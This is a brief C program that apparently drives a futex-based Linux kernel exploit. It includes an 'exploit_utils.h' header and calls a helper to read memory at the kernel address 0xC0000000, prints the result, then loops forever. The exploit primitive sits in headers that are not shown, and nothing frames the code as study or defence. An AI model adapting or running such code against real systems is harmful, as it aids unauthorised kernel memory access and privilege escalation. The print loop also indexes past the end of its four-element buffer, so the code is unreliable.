#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include "futex.h"
#include "exploit_utils.h"

int main(int argc, char *argv[])
{
    int buf[4];
    int i;
    printf("[%s]futex_read_values_at_address.\n", __FUNCTION__);
    futex_read_values_at_address(0xC0000000, buf, sizeof(buf));
    printf("[%s]futex_read_values_at_address called.\n", __FUNCTION__);
    for(i = 0; i < sizeof(buf); i++) {
        printf("%02x, ", buf[i]);
    }
    printf("[%s]infinite loop.\n", __FUNCTION__);
    while(1) {
        sleep(1);
    }
}
